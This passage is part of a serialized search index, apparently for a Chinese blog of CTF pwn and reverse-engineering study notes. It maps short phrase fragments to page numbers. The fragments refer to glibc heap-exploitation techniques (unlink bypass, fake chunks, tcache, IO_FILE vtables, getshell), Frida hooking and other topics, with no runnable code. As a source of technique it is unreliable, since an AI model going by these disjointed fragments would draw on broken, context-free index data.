"这里写图片描述\",{\"1\":{\"433\":1,\"434\":1}}],[\"这里好好学一下栈迁移这个知识点\",{\"1\":{\"444\":1}}],[\"这里也是放原文的图\",{\"1\":{\"434\":1}}],[\"这里也可以在启动后再\",{\"1\":{\"118\":1}}],[\"这里放原文中的图\",{\"1\":{\"433\":1}}],[\"这里放不下\",{\"1\":{\"131\":1}}],[\"这里用wiki中提供的代码进行调试理解\",{\"1\":{\"431\":1}}],[\"这里上大佬的图\",{\"1\":{\"403\":1}}],[\"这里推荐自己用有符号的libc自己调试几下\",{\"1\":{\"402\":1}}],[\"这里阅读一下io函数的源码\",{\"1\":{\"402\":1}}],[\"这里阅读了大致逻辑后进行总结\",{\"1\":{\"384\":1}}],[\"这里是执行mov\",{\"1\":{\"446\":1}}],[\"这里是常量指针\",{\"1\":{\"399\":1}}],[\"这里是去除了不重要的tcache\",{\"1\":{\"305\":1}}],[\"这里贴出\",{\"1\":{\"397\":1}}],[\"这里比较麻烦的就是fakechunk\",{\"1\":{\"374\":1,\"496\":1}}],[\"这里出现的arena数量的上限\",{\"1\":{\"352\":1}}],[\"这里原文章讲特别好\",{\"1\":{\"330\":1}}],[\"这里应该是设置head的一系列操作\",{\"1\":{\"321\":1}}],[\"这里避免删除chunk\",{\"1\":{\"321\":1}}],[\"这里就要简单很多了\",{\"1\":{\"368\":1}}],[\"这里就要复杂一点了\",{\"1\":{\"367\":1}}],[\"这里就是pop\",{\"1\":{\"446\":1}}],[\"这里就是检查bk是否等于tcache\",{\"1\":{\"342\":1}}],[\"这里就是重点了\",{\"1\":{\"319\":1}}],[\"这里就不重复赘述了\",{\"1\":{\"6\":1,\"149\":1}}],[\"这里先粗略写一下原理\",{\"1\":{\"372\":1,\"494\":1}}],[\"这里先简单说一下我们要干什么\",{\"1\":{\"363\":1}}],[\"这里先是入的chunk\",{\"1\":{\"319\":1}}],[\"这里先解释一下什么是构造方法java中类在定义的时候\",{\"1\":{\"124\":1}}],[\"这里把最后的部分\",{\"1\":{\"317\":1}}],[\"这里主要是学习一下程序在查找libc的时候的顺序\",{\"1\":{\"453\":1}}],[\"这里主要是讲一下原理\",{\"1\":{\"393\":1}}],[\"这里主要是利用先让chunk0的bk\",{\"1\":{\"366\":1}}],[\"这里主要是绕过unlink\",{\"1\":{\"345\":1}}],[\"这里主要是将unsortedbin合并后的\",{\"1\":{\"316\":1}}],[\"这里主要是列举几个设计模式\",{\"1\":{\"244\":1}}],[\"这里猜测就是一个最小chunk\",{\"1\":{\"313\":1}}],[\"这里我是这样理解的当我们自己设计一个文件读取管理器\",{\"1\":{\"401\":1}}],[\"这里我理解的是largebin存在两条链\",{\"1\":{\"319\":1}}],[\"这里我简化了部分链\",{\"1\":{\"306\":1}}],[\"这里我们选择打malloc\",{\"1\":{\"488\":1}}],[\"这里我们动调发现value的值在xor第三次的时候就终止了\",{\"1\":{\"461\":1}}],[\"这里我们假设解析后的地址已经由\",{\"1\":{\"449\":1}}],[\"这里我们不对plt和got表内详细内容进行介绍了\",{\"1\":{\"449\":1}}],[\"这里我们理解即可\",{\"1\":{\"400\":1}}],[\"这里我们将记录信息的chunk称之为头chunk\",{\"1\":{\"374\":1,\"496\":1}}],[\"这里我们已经成功构造好了\",{\"1\":{\"365\":1}}],[\"这里我们主要观察next\",{\"1\":{\"347\":1}}],[\"这里我们可以直观看见bck\",{\"1\":{\"306\":1}}],[\"这里我们就得到了偏移\",{\"1\":{\"287\":1}}],[\"这里我们拿到包名字\",{\"1\":{\"130\":1}}],[\"这里多了一条if检查语句\",{\"1\":{\"303\":1}}],[\"这里记录一下为什么常规overlapping会失效\",{\"1\":{\"299\":1}}],[\"这里等效为\",{\"1\":{\"296\":1}}],[\"这里tcache\",{\"1\":{\"286\":1}}],[\"这里testa和testb就同步运行了\",{\"1\":{\"282\":1}}],[\"这里很关键因为会检查前后chunk中\",{\"1\":{\"296\":1}}],[\"这里很绕建议直接看原文章的图\",{\"1\":{\"275\":1}}],[\"这里很多前提知识\",{\"1\":{\"126\":1}}],[\"这里称为g\",{\"1\":{\"275\":1}}],[\"这里最好直接去看原文\",{\"1\":{\"275\":1}}],[\"这里num为1就是让ba25a9d\",{\"1\":{\"274\":1}}],[\"这里只是浅浅展示一下基础会用到的指令\",{\"1\":{\"258\":1}}],[\"这里upgarder是用于升级http为websocket链接的\",{\"1\":{\"254\":1}}],[\"这里拿mvc进行举列子\",{\"1\":{\"252\":1}}],[\"这里简单的了解一下mvc设计模式\",{\"1\":{\"246\":1}}],[\"这里强烈直接观看原文\",{\"1\":{\"244\":1}}],[\"这里求解就用\",{\"1\":{\"240\":1}}],[\"这里看见了大佬的文章感觉说得很对\",{\"1\":{\"245\":1}}],[\"这里看名字就大概知道istextwidgetactive是检测\",{\"1\":{\"136\":1}}],[\"这里看教程大概就是\",{\"1\":{\"130\":1}}],[\"这里搜了去\",{\"1\":{\"131\":1}}],[\"这里学习到的\",{\"1\":{\"128\":1}}],[\"这里如果这个函数不是导出函数则我们通过偏移来获取这个函数这个步骤\",{\"1\":{\"127\":1}}],[\"这里会去找到程序中所有实现了指定类的对象\",{\"1\":{\"125\":1}}],[\"这里重载函数是java里面的一个特性\",{\"1\":{\"123\":1}}],[\"这里引用一下参考文章的列子\",{\"1\":{\"121\":1}}],[\"这里大量直接进行copy\",{\"1\":{\"53\":1,\"193\":1}}],[\"这里利用的是mmap函数进行的申请内存\",{\"1\":{\"50\":1,\"190\":1}}],[\"这里和x86不同的是arm架构是先进行栈帧展开\",{\"1\":{\"47\":1,\"187\":1}}],[\"这里的存储数据为0xc7df9b0041348000\",{\"1\":{\"470\":1}}],[\"这里的初始值几乎全部都是赋值的null\",{\"1\":{\"403\":1}}],[\"这里的vtable的值可以改变\",{\"1\":{\"399\":1}}],[\"这里的chunk3的地址要特殊一些\",{\"1\":{\"365\":1}}],[\"这里的function\",{\"1\":{\"451\":1}}],[\"这里的fd就是我们后面要free的任意chunk\",{\"1\":{\"377\":1,\"499\":1}}],[\"这里的fd\",{\"1\":{\"345\":1}}],[\"这里的fwd和bck记好了\",{\"1\":{\"316\":1}}],[\"这里的代码\",{\"1\":{\"325\":1}}],[\"这里的安全机制全是对unsortedbin中的chunk进行的检查\",{\"1\":{\"312\":1}}],[\"这里的num\",{\"1\":{\"274\":1}}],[\"这里的n就代表欧拉函数\",{\"1\":{\"240\":1}}],[\"这里的echomessage就是handler\",{\"1\":{\"254\":1}}],[\"这里的字段指的是类中定义的成员属性然后这里修改非静态的字段用到的是java\",{\"1\":{\"125\":1}}],[\"这里的\",{\"1\":{\"118\":1}}],[\"这里的a\",{\"1\":{\"24\":1,\"166\":1}}],[\"这里的地址有特殊用途\",{\"1\":{\"16\":1,\"158\":1}}],[\"这里涉及快照的概念\",{\"1\":{\"8\":1,\"150\":1}}],[\"这里有总结linux内存管理\",{\"1\":{\"5\":1,\"148\":1}}],[\"函数允许一个线程等待另一个线程结束\",{\"1\":{\"458\":1}}],[\"函数是\",{\"1\":{\"458\":1}}],[\"函数在成功时返回\",{\"1\":{\"458\":1}}],[\"函数的参数的指针\",{\"1\":{\"458\":1}}],[\"函数的伪声明\",{\"1\":{\"449\":1}}],[\"函数成功完成时\",{\"1\":{\"458\":1}}],[\"函数返回时\",{\"1\":{\"423\":1}}],[\"函数返回值\",{\"1\":{\"32\":1,\"174\":1}}],[\"函数尾部\",{\"1\":{\"403\":1}}],[\"函数就可以轻易完成对文件地操作\",{\"1\":{\"401\":1}}],[\"函数被调用\",{\"1\":{\"281\":1}}],[\"函数才会真正执行\",{\"1\":{\"281\":1}}],[\"函数执行\",{\"1\":{\"281\":1}}],[\"函数调用的时候就变成了生成器\",{\"1\":{\"281\":1}}],[\"函数调用规范\",{\"0\":{\"29\":1,\"171\":1},\"1\":{\"47\":1,\"187\":1}}],[\"函数地址=so地址+函数偏移\",{\"1\":{\"127\":1}}],[\"函数准备\",{\"1\":{\"43\":1,\"183\":1}}],[\"函数与linux中的多线程编程\",{\"1\":{\"16\":1,\"158\":1}}],[\"函数时\",{\"1\":{\"4\":1,\"147\":1,\"423\":1}}],[\"函数\",{\"1\":{\"4\":1,\"147\":1,\"243\":1,\"458\":1}}],[\"和mips一模一样\",{\"1\":{\"486\":1}}],[\"和jmp\",{\"1\":{\"449\":1}}],[\"和open等函数操作的文件\",{\"1\":{\"400\":1}}],[\"和heap地址\",{\"1\":{\"372\":1,\"494\":1}}],[\"和bk\",{\"1\":{\"329\":1,\"365\":1}}],[\"和victim\",{\"1\":{\"325\":1}}],[\"和fwrite函数需要文件流指针调用虚表函数\",{\"1\":{\"400\":1}}],[\"和foot\",{\"1\":{\"324\":1}}],[\"和fd\",{\"1\":{\"319\":1}}],[\"和size两个部分\",{\"1\":{\"329\":1}}],[\"和size\",{\"1\":{\"324\":1}}],[\"和size的地方\",{\"1\":{\"324\":1}}],[\"和名字表达的意思一样\",{\"1\":{\"280\":1}}],[\"和值得注意的一些东西\",{\"1\":{\"244\":1}}],[\"和dp\",{\"1\":{\"243\":1}}],[\"和伦纳德\",{\"1\":{\"238\":1}}],[\"和retf一样但是retfq是从64位转化到32位\",{\"1\":{\"44\":1,\"184\":1}}],[\"和chunk6的fd指向我们构造的chunk\",{\"1\":{\"365\":1}}],[\"和chunk4\",{\"1\":{\"365\":1}}],[\"和chunk\",{\"1\":{\"365\":1,\"369\":1}}],[\"和completion\",{\"1\":{\"43\":1,\"183\":1}}],[\"和cq\",{\"1\":{\"43\":1,\"183\":1}}],[\"和writev\",{\"1\":{\"40\":1,\"180\":1}}],[\"和中断处理机制一样用了选择子和页内偏移的方式来寻址\",{\"1\":{\"10\":1,\"152\":1}}],[\"和\",{\"0\":{\"317\":1,\"347\":1,\"456\":1},\"1\":{\"4\":1,\"41\":1,\"147\":1,\"181\":1,\"268\":1}}],[\"在申请large\",{\"1\":{\"491\":1}}],[\"在处理文本时会将这些字符视为字段之间的分隔符\",{\"1\":{\"466\":1}}],[\"在处理多个文件时不打印每个文件的名称作为头部\",{\"1\":{\"464\":1}}],[\"在退出\",{\"1\":{\"464\":1}}],[\"在到达文件末尾时自动退出\",{\"1\":{\"464\":1}}],[\"在搜索时忽略大小写\",{\"1\":{\"464\":1}}],[\"在失败时返回非零错误编号\",{\"1\":{\"458\":1}}],[\"在以前我的理解就是这是存储的文件数据的一个结构\",{\"1\":{\"400\":1}}],[\"在一个大的chunk中\",{\"1\":{\"365\":1}}],[\"在一开始的时候提过\",{\"1\":{\"319\":1}}],[\"在最后会将arahat0师傅的脚本给出来\",{\"1\":{\"361\":1}}],[\"在写入内容的时候最后加了一个0导致我们没办法读出来\",{\"1\":{\"360\":1}}],[\"在使用的就只有prev\",{\"1\":{\"329\":1}}],[\"在使用套接字进行网络编程时\",{\"1\":{\"4\":1,\"147\":1}}],[\"在linux中\",{\"1\":{\"327\":1}}],[\"在这里已经将chunk从unsortdbin中移除\",{\"1\":{\"314\":1}}],[\"在这种方式下\",{\"1\":{\"10\":1,\"152\":1}}],[\"在delemo的时候是根据emo\",{\"1\":{\"293\":1}}],[\"在addemo的时候name\",{\"1\":{\"293\":1}}],[\"在android\",{\"1\":{\"140\":1}}],[\"在go中建立websocket链接本质是对普通链接的升级\",{\"1\":{\"254\":1}}],[\"在go语言中闭包函数\",{\"1\":{\"31\":1,\"173\":1}}],[\"在开发中经常发生这种情况\",{\"1\":{\"245\":1}}],[\"在数论中\",{\"1\":{\"240\":1}}],[\"在了解rsa算法之前\",{\"1\":{\"238\":1}}],[\"在hook函数之后执行\",{\"1\":{\"127\":1}}],[\"在hook函数之前执行\",{\"1\":{\"127\":1}}],[\"在整个搜索流程完成的时候会调用\",{\"1\":{\"125\":1}}],[\"在调用的时候只需要修改参数就可以实现调用不同的实现由于函数名字是一样的所以我猜测frida就难以仅仅靠一个名字来实现hook了\",{\"1\":{\"123\":1}}],[\"在\",{\"1\":{\"71\":1,\"211\":1,\"252\":1,\"449\":1}}],[\"在进行重新读取即可\",{\"1\":{\"68\":1,\"208\":1}}],[\"在进行bl等指令的时候\",{\"1\":{\"47\":1,\"187\":1}}],[\"在复习中断的时候\",{\"1\":{\"63\":1,\"203\":1}}],[\"在堆栈上分配一些缓冲区\",{\"1\":{\"47\":1,\"187\":1}}],[\"在禁用了大量函数的情况下\",{\"1\":{\"42\":1,\"182\":1}}],[\"在prctl\",{\"1\":{\"41\":1,\"181\":1}}],[\"在x86\",{\"1\":{\"38\":1,\"178\":1}}],[\"在为栈分配内存后\",{\"1\":{\"38\":1,\"178\":1}}],[\"在创建新线程的时候\",{\"1\":{\"38\":1,\"178\":1}}],[\"在给定的编程语言设计中\",{\"1\":{\"32\":1,\"174\":1}}],[\"在程序中或者ctf题中\",{\"1\":{\"16\":1,\"158\":1}}],[\"在需要用到这个页表项对应的空间时才进行填写\",{\"1\":{\"10\":1,\"152\":1}}],[\"在fork的时候\",{\"1\":{\"4\":1,\"147\":1}}],[\"在关闭套接字时\",{\"1\":{\"4\":1,\"147\":1}}],[\"套接字函数来实现\",{\"1\":{\"42\":1,\"182\":1}}],[\"套接字是一种用于网络通信的接口\",{\"1\":{\"4\":1,\"147\":1}}],[\"套接字是一个重要的概念\",{\"1\":{\"4\":1,\"147\":1}}],[\"套接字\",{\"0\":{\"4\":1,\"147\":1}}],[\"八股文部分\",{\"1\":{\"2\":1,\"10\":1,\"145\":1,\"152\":1}}],[\"秋招复习笔记\",{\"1\":{\"2\":1,\"10\":1,\"145\":1,\"152\":1}}],[\"热更\",{\"0\":{\"2\":1,\"145\":1}}],[\"myheap\",{\"0\":{\"489\":1,\"492\":1,\"503\":1}}],[\"my\",{\"1\":{\"463\":1}}],[\"mtsafe\",{\"1\":{\"403\":2,\"407\":1}}],[\"mbstate\",{\"1\":{\"390\":2,\"408\":2}}],[\"must\",{\"1\":{\"353\":1}}],[\"musl\",{\"1\":{\"52\":2,\"192\":2}}],[\"musl堆管理器\",{\"0\":{\"52\":1,\"192\":1}}],[\"mutex\",{\"1\":{\"339\":2,\"347\":1}}],[\"munmap\",{\"1\":{\"324\":2}}],[\"multiple\",{\"1\":{\"324\":1}}],[\"mfastbinptr\",{\"1\":{\"324\":1,\"347\":1}}],[\"mprotect\",{\"1\":{\"504\":1}}],[\"mp\",{\"1\":{\"315\":1,\"324\":5,\"342\":2,\"352\":3,\"353\":2}}],[\"mchunkptr\",{\"1\":{\"312\":1,\"324\":5,\"339\":1,\"344\":3,\"345\":2,\"347\":3,\"353\":1}}],[\"mstate\",{\"1\":{\"324\":1,\"344\":1,\"351\":2,\"352\":3,\"353\":7}}],[\"ms\",{\"1\":{\"261\":1}}],[\"msg\",{\"1\":{\"254\":3}}],[\"msgtype\",{\"1\":{\"254\":2}}],[\"mdev\",{\"1\":{\"261\":1}}],[\"mvc对于中小型项目并不是很友好\",{\"1\":{\"246\":1}}],[\"mvc架构在设计的时候将视图层和业务层进行了分离\",{\"1\":{\"246\":1}}],[\"mvc设计模式\",{\"1\":{\"246\":1}}],[\"mvc模式介绍\",{\"1\":{\"246\":1}}],[\"mvc代码设计模式\",{\"0\":{\"246\":1}}],[\"mm\",{\"0\":{\"76\":1,\"216\":1},\"1\":{\"438\":23,\"439\":14,\"441\":5,\"442\":9}}],[\"mmap等虚表中\",{\"1\":{\"395\":1}}],[\"mmap和\",{\"1\":{\"395\":1}}],[\"mmap函数\",{\"1\":{\"327\":1,\"330\":1}}],[\"mmapped\",{\"1\":{\"324\":2}}],[\"mmap\",{\"1\":{\"74\":2,\"77\":1,\"214\":2,\"217\":1,\"324\":1,\"327\":1,\"353\":1,\"395\":7,\"403\":1,\"419\":1}}],[\"mmu\",{\"1\":{\"9\":1,\"151\":1}}],[\"mkdir\",{\"1\":{\"73\":2,\"213\":2}}],[\"m\",{\"1\":{\"73\":1,\"213\":1,\"240\":3,\"243\":1,\"274\":1,\"369\":2,\"464\":2}}],[\"most\",{\"1\":{\"347\":1}}],[\"months\",{\"1\":{\"258\":1}}],[\"monitor\",{\"1\":{\"73\":1,\"213\":1}}],[\"modifications\",{\"1\":{\"324\":1,\"339\":1}}],[\"mod\",{\"1\":{\"240\":6,\"242\":1,\"243\":1}}],[\"model通常不需要依赖view与controller\",{\"1\":{\"247\":1}}],[\"model\",{\"0\":{\"247\":1},\"1\":{\"246\":1}}],[\"mode\",{\"1\":{\"74\":2,\"214\":2,\"389\":1,\"397\":2,\"403\":1,\"408\":1,\"410\":1,\"419\":1,\"426\":4}}],[\"mojang\",{\"1\":{\"134\":12,\"136\":1}}],[\"more命令\",{\"1\":{\"464\":1}}],[\"morecore\",{\"1\":{\"324\":1}}],[\"more\",{\"1\":{\"131\":1,\"142\":1,\"464\":1}}],[\"mount\",{\"1\":{\"73\":1,\"213\":1}}],[\"movabs\",{\"1\":{\"483\":1}}],[\"movsb是两字节\",{\"1\":{\"482\":1}}],[\"movsb即可\",{\"1\":{\"482\":1}}],[\"movsb指令\",{\"1\":{\"482\":1}}],[\"movq\",{\"1\":{\"449\":1}}],[\"mov\",{\"1\":{\"47\":2,\"187\":2,\"446\":1,\"473\":2,\"483\":37}}],[\"might\",{\"1\":{\"324\":5,\"339\":3}}],[\"misalign\",{\"1\":{\"353\":4}}],[\"misaligned\",{\"1\":{\"324\":1}}],[\"misc\",{\"1\":{\"324\":2}}],[\"mismatching\",{\"1\":{\"312\":1}}],[\"mildly\",{\"1\":{\"286\":1}}],[\"mirrors\",{\"1\":{\"261\":5}}],[\"microsoft\",{\"1\":{\"131\":1}}],[\"mipsel\",{\"1\":{\"485\":2}}],[\"mips\",{\"0\":{\"485\":1},\"1\":{\"49\":2,\"189\":2,\"475\":1,\"484\":1,\"485\":6,\"486\":1,\"488\":1}}],[\"mips是存在叶子函数的\",{\"1\":{\"49\":1,\"189\":1}}],[\"mips架构的函数调用规范\",{\"0\":{\"49\":1,\"189\":1}}],[\"minimally\",{\"1\":{\"353\":1}}],[\"minsize\",{\"1\":{\"313\":1,\"321\":1,\"324\":2}}],[\"minutes\",{\"1\":{\"258\":2}}],[\"minecraftpe\",{\"1\":{\"134\":12,\"136\":1}}],[\"min\",{\"1\":{\"43\":2,\"74\":1,\"183\":2,\"214\":1,\"261\":1}}],[\"midnightsunctf\",{\"1\":{\"39\":1,\"179\":1}}],[\"magic\",{\"1\":{\"482\":1,\"483\":3}}],[\"make\",{\"1\":{\"389\":1}}],[\"mask\",{\"1\":{\"353\":1,\"503\":2}}],[\"manba\",{\"1\":{\"380\":1,\"502\":1}}],[\"many\",{\"1\":{\"352\":1,\"369\":1}}],[\"manifest标签\",{\"1\":{\"141\":1}}],[\"matches\",{\"1\":{\"342\":1}}],[\"matter\",{\"1\":{\"0\":1}}],[\"markers\",{\"1\":{\"408\":1}}],[\"marked\",{\"1\":{\"324\":1}}],[\"mark\",{\"1\":{\"317\":1,\"319\":1}}],[\"maybe\",{\"1\":{\"353\":1,\"395\":3,\"403\":1,\"419\":1}}],[\"may\",{\"1\":{\"258\":2}}],[\"malloc下来\",{\"1\":{\"488\":1}}],[\"malloc一个large\",{\"1\":{\"376\":1,\"498\":1}}],[\"malloc一个0x18的chunk\",{\"1\":{\"371\":1,\"493\":1}}],[\"malloc函数中\",{\"1\":{\"351\":1}}],[\"malloc函数中的一些检查机制\",{\"0\":{\"54\":1,\"194\":1}}],[\"malloc函数\",{\"1\":{\"336\":1}}],[\"malloc的流程\",{\"1\":{\"307\":1}}],[\"malloc的时候优先去tcahe中找\",{\"1\":{\"285\":1}}],[\"malloc源码分析\",{\"0\":{\"336\":1},\"1\":{\"307\":1}}],[\"malloc源码细读\",{\"0\":{\"307\":1}}],[\"malloc与free\",{\"1\":{\"307\":1}}],[\"malloced\",{\"1\":{\"305\":1,\"313\":1,\"315\":1,\"322\":1}}],[\"malloc回来\",{\"1\":{\"302\":1,\"487\":1}}],[\"malloc\",{\"0\":{\"308\":1,\"406\":1,\"439\":1,\"441\":1,\"484\":1},\"1\":{\"54\":1,\"55\":1,\"60\":3,\"194\":1,\"195\":1,\"200\":3,\"290\":1,\"293\":1,\"296\":2,\"305\":2,\"312\":10,\"319\":4,\"321\":2,\"324\":16,\"325\":2,\"331\":2,\"342\":1,\"344\":3,\"345\":2,\"346\":1,\"347\":4,\"348\":1,\"350\":1,\"353\":7,\"378\":1,\"403\":1,\"407\":1,\"408\":1,\"475\":6,\"500\":1}}],[\"malloc过程\",{\"1\":{\"53\":1,\"193\":1}}],[\"max\",{\"1\":{\"47\":4,\"187\":4,\"261\":1,\"284\":1,\"286\":2,\"324\":2,\"335\":1,\"347\":2,\"352\":3,\"439\":1,\"441\":1}}],[\"main+34\",{\"1\":{\"488\":2,\"491\":1,\"503\":2}}],[\"main+33\",{\"1\":{\"358\":1,\"359\":1}}],[\"main+516\",{\"1\":{\"484\":1}}],[\"main+57\",{\"1\":{\"369\":1}}],[\"main+181\",{\"1\":{\"483\":1}}],[\"main+273\",{\"1\":{\"482\":1}}],[\"main+42\",{\"1\":{\"475\":1}}],[\"main函数返回\",{\"1\":{\"383\":1}}],[\"main函数\",{\"1\":{\"356\":1}}],[\"main函数参数含义\",{\"0\":{\"37\":1,\"177\":1}}],[\"main用于部署稳定的版本\",{\"1\":{\"268\":1}}],[\"main搭配\",{\"1\":{\"143\":1}}],[\"mainifest\",{\"1\":{\"141\":1}}],[\"mainactivity\",{\"1\":{\"134\":10,\"136\":1}}],[\"maintainers\",{\"0\":{\"110\":1}}],[\"main\",{\"1\":{\"30\":2,\"50\":1,\"121\":2,\"124\":1,\"125\":1,\"131\":3,\"143\":2,\"144\":1,\"172\":2,\"190\":1,\"290\":1,\"305\":2,\"311\":35,\"313\":2,\"319\":1,\"321\":4,\"324\":1,\"346\":1,\"349\":2,\"351\":3,\"353\":2,\"397\":1,\"404\":1,\"423\":1,\"431\":1,\"438\":1,\"459\":1,\"462\":1,\"470\":3,\"471\":1,\"479\":1,\"481\":1,\"504\":1,\"505\":1}}],[\"map\",{\"1\":{\"30\":1,\"36\":1,\"172\":1,\"176\":1,\"438\":3,\"449\":2,\"450\":1}}],[\"m3ng\",{\"1\":{\"1\":1}}],[\"mebeim\",{\"1\":{\"483\":1}}],[\"menu+113\",{\"1\":{\"473\":1}}],[\"menu\",{\"1\":{\"358\":4,\"359\":4,\"475\":4,\"484\":5,\"488\":5}}],[\"men也就是该分配去的内存分配总量\",{\"1\":{\"312\":1}}],[\"memcpy\",{\"1\":{\"404\":1}}],[\"memory\",{\"1\":{\"324\":2,\"342\":1,\"347\":1,\"351\":1,\"353\":1}}],[\"mem的传统检查\",{\"1\":{\"324\":1}}],[\"mem\",{\"1\":{\"312\":2,\"324\":4,\"339\":4,\"347\":2,\"353\":2}}],[\"merge\",{\"1\":{\"274\":2,\"275\":1}}],[\"med\",{\"1\":{\"240\":1}}],[\"me\",{\"1\":{\"240\":2}}],[\"method\",{\"1\":{\"134\":2,\"136\":1}}],[\"methods\",{\"1\":{\"126\":1,\"131\":4}}],[\"methods=clz\",{\"1\":{\"126\":1}}],[\"me1\",{\"1\":{\"1\":1}}],[\"meimeng\",{\"1\":{\"1\":1}}],[\"wchb\",{\"1\":{\"408\":4}}],[\"wch\",{\"1\":{\"408\":4}}],[\"wchar\",{\"1\":{\"390\":12,\"391\":1,\"408\":12}}],[\"wd结构体\",{\"1\":{\"408\":1}}],[\"wd\",{\"1\":{\"403\":1,\"407\":1,\"408\":1,\"410\":2,\"411\":1}}],[\"wdefault\",{\"1\":{\"395\":6}}],[\"wjump1\",{\"1\":{\"395\":2}}],[\"wfile\",{\"0\":{\"395\":1},\"1\":{\"395\":26,\"403\":1,\"410\":1,\"411\":1}}],[\"work\",{\"1\":{\"469\":1}}],[\"world字符串来实现getshell\",{\"1\":{\"489\":1}}],[\"world\",{\"0\":{\"481\":1},\"1\":{\"49\":1,\"125\":1,\"131\":1,\"189\":1,\"485\":1,\"486\":1}}],[\"woverflow\",{\"1\":{\"395\":1}}],[\"won\",{\"1\":{\"324\":1}}],[\"wide\",{\"0\":{\"390\":1},\"1\":{\"384\":1,\"388\":4,\"389\":3,\"390\":4,\"395\":9,\"396\":3,\"397\":14,\"403\":1,\"407\":1,\"408\":4,\"410\":18,\"411\":2,\"417\":1,\"426\":4}}],[\"within\",{\"1\":{\"428\":1}}],[\"with\",{\"1\":{\"311\":1,\"349\":1,\"353\":3,\"380\":1,\"397\":2,\"502\":1,\"503\":1}}],[\"without\",{\"1\":{\"307\":1}}],[\"wiki\",{\"1\":{\"307\":3}}],[\"will\",{\"1\":{\"290\":1,\"428\":1}}],[\"window\",{\"1\":{\"133\":1}}],[\"windows\",{\"1\":{\"131\":1,\"258\":1,\"261\":1}}],[\"when\",{\"1\":{\"410\":1}}],[\"whether\",{\"1\":{\"324\":4}}],[\"while\",{\"1\":{\"279\":1,\"290\":1,\"310\":1,\"319\":1,\"321\":1,\"324\":1,\"339\":1,\"349\":1,\"351\":1,\"353\":1,\"439\":2,\"441\":1,\"442\":1,\"460\":1,\"463\":1}}],[\"which\",{\"1\":{\"270\":1,\"286\":1,\"324\":2,\"349\":1,\"353\":1,\"391\":1,\"428\":1}}],[\"why\",{\"1\":{\"270\":1}}],[\"what\",{\"1\":{\"270\":1}}],[\"week2\",{\"0\":{\"522\":1}}],[\"weeks\",{\"1\":{\"258\":1}}],[\"welcome\",{\"1\":{\"485\":1,\"486\":1}}],[\"we\",{\"1\":{\"270\":1,\"286\":1,\"321\":1,\"324\":12,\"339\":6,\"342\":3,\"352\":1,\"389\":1,\"417\":2}}],[\"wenku\",{\"1\":{\"255\":1}}],[\"websocket是建立在tcp协议之上的\",{\"1\":{\"435\":1}}],[\"websocket是通过模仿socket协议产生的\",{\"1\":{\"435\":1}}],[\"websocket协议实现相对简单\",{\"1\":{\"253\":1}}],[\"websocket\",{\"0\":{\"435\":1},\"1\":{\"253\":1,\"254\":3,\"255\":5,\"435\":1}}],[\"w\",{\"1\":{\"254\":3}}],[\"wstrnfile\",{\"0\":{\"391\":1},\"1\":{\"391\":1}}],[\"wstrn\",{\"0\":{\"387\":1},\"1\":{\"384\":2,\"385\":1,\"387\":4,\"388\":2,\"397\":6}}],[\"ws\",{\"1\":{\"254\":2}}],[\"wait\",{\"1\":{\"458\":1,\"460\":1}}],[\"waite\",{\"1\":{\"358\":4,\"359\":4}}],[\"wasted\",{\"1\":{\"342\":1}}],[\"was\",{\"1\":{\"324\":1,\"342\":1}}],[\"want\",{\"1\":{\"324\":1,\"339\":1,\"369\":1}}],[\"watch\",{\"1\":{\"134\":2,\"136\":1}}],[\"wakeup\",{\"1\":{\"1\":1}}],[\"wake0p\",{\"1\":{\"1\":1}}],[\"wrapps\",{\"1\":{\"324\":1}}],[\"wrapper类的method方法\",{\"1\":{\"121\":1}}],[\"write函数\",{\"1\":{\"505\":1}}],[\"writebufferpool\",{\"1\":{\"254\":1}}],[\"writebuffersize\",{\"1\":{\"254\":2}}],[\"writeheader\",{\"1\":{\"254\":1}}],[\"writemessage\",{\"1\":{\"254\":1,\"255\":1}}],[\"writev\",{\"1\":{\"43\":1,\"183\":1}}],[\"write\",{\"1\":{\"8\":1,\"40\":3,\"41\":1,\"150\":1,\"180\":3,\"181\":1,\"254\":2,\"349\":1,\"353\":1,\"390\":3,\"395\":6,\"397\":2,\"401\":2,\"408\":9,\"410\":3,\"426\":10,\"483\":1,\"503\":1}}],[\"www\",{\"1\":{\"15\":1,\"140\":1,\"157\":1}}],[\"wwzx\",{\"1\":{\"1\":1}}],[\"2+p64\",{\"1\":{\"491\":1}}],[\"2+n\",{\"1\":{\"449\":1}}],[\"28355\",{\"1\":{\"471\":1}}],[\"28125\",{\"1\":{\"469\":3,\"470\":2}}],[\"28\",{\"1\":{\"461\":1,\"473\":1}}],[\"28h\",{\"1\":{\"459\":1}}],[\"21\",{\"1\":{\"461\":1,\"488\":1}}],[\"2存的是\",{\"1\":{\"449\":1}}],[\"2原理\",{\"0\":{\"393\":1}}],[\"2到63是small\",{\"1\":{\"347\":1}}],[\"2^<size\",{\"1\":{\"342\":1}}],[\"2学习笔记\",{\"0\":{\"331\":1}}],[\"264是调试出来的\",{\"1\":{\"505\":1}}],[\"26\",{\"1\":{\"461\":1}}],[\"26开始引入\",{\"1\":{\"338\":1}}],[\"26引入\",{\"1\":{\"330\":1}}],[\"26gx\",{\"1\":{\"287\":3}}],[\"2则是1c7036f\",{\"1\":{\"274\":1}}],[\"2mb\",{\"1\":{\"258\":1,\"438\":1}}],[\"2207216\",{\"1\":{\"503\":1}}],[\"2206944\",{\"1\":{\"373\":1,\"495\":1}}],[\"222\",{\"1\":{\"261\":4}}],[\"226\",{\"1\":{\"261\":5}}],[\"22\",{\"1\":{\"258\":1,\"461\":1}}],[\"229\",{\"1\":{\"1\":1}}],[\"2fdocker\",{\"1\":{\"258\":1}}],[\"2fpipe\",{\"1\":{\"258\":1}}],[\"2f\",{\"1\":{\"258\":2}}],[\"2fo操作的系统调用都通过文件描述符来实现\",{\"1\":{\"15\":1,\"157\":1}}],[\"27$p\",{\"1\":{\"473\":1}}],[\"27的源码\",{\"1\":{\"304\":1}}],[\"27下\",{\"1\":{\"303\":1}}],[\"27\",{\"1\":{\"257\":1,\"355\":1,\"357\":1,\"461\":1}}],[\"23的\",{\"1\":{\"262\":1}}],[\"238\",{\"1\":{\"261\":4}}],[\"23\",{\"0\":{\"423\":1},\"1\":{\"56\":1,\"196\":1,\"257\":1,\"331\":1,\"461\":1}}],[\"23内核用ptctl来代替\",{\"1\":{\"41\":1,\"181\":1}}],[\"290\",{\"1\":{\"365\":1,\"369\":1}}],[\"29后加入了对size区域的检查\",{\"1\":{\"56\":1,\"196\":1}}],[\"29\",{\"1\":{\"46\":1,\"56\":1,\"186\":1,\"196\":1,\"461\":1,\"488\":1}